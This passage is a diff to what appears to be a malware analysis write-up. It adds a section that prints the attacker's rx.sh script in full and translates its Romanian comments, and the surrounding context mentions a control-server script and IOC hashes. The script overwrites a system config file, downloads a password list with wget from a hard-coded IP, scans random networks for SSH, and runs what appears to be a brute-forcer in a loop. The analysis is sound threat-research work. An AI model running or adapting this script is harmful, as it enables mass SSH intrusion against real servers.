@@ -126,6 +126,53 @@ while True:
 
 The snippet above shows the contents of the `send_vuln.py` file. The file is written in Python. By looking at the script it looks like the Python script reads the `k_config.json` file to gather the port and IP of the control server, the code then uses Python's socket module to connect to server. 
 
+## rx.sh 
+The snippet above shows the contents of the rx.sh file. 
+```bash
+rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999
+while true; do
+
+        ###      Aici incarcam parolele!!
+
+        File=mic
+        rm -rf "$File"
+        echo "#Incarc Parolele#"
+        wget http://209.141.58.203/.db/$File
+        if grep -q oracle "$File";
+        then
+        cat "$File" > passfile.txt
+        fi
+        rm -rf "$File"
+
+
+
+
+        #### Aici stergem fisierele anterioare si scanam unele noi!!
+
+        rm -rf bios.txt mfu.txt ipuri scan.lst banner.log
+        echo "###Incarc Ipuri###"
+        random="$((30 + $RANDOM % 224))"
+        ./cosynus 22 -a "$random" -s 10 > /dev/null
+        pkill -f cosynus
+        pkill -f ./cosynus
+        cat bios.txt |uniq > mfu.txt
+        rm -rf bios.txt
+        sleep 1
+        echo "#Am terminat de scanat, dau drumu la banner#"
+        ./boner mfu.txt 22 1000 > /dev/null
+        pkill -f boner
+        pkill -f ./boner
+        cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq >> scan.lst
+        cat scan.lst |uniq > ipuri
+        ./main 1000
+         echo "$random" >> oK
+done
+```
+The rx.sh script contains a couple of comments like `Aici incarcam parolele!!`. Using Google translate the author was able to figure out that the author of the malware might be a native Romanian speaker. The English translation of `Aici incarcam parolele!!` is `
+Here we upload the passwords !!` according to Google Translate. 
+
+Another comment inside the bash file contained the Romanian text, `Aici stergem fisierele anterioare si scanam unele noi!!`. The English translation is `Here we delete the previous files and scan new ones !!`.
+
 
 ### IOC
 dfa6d202fc24623a5aadf3684aadcfbce72ee8aa  config.json<br>
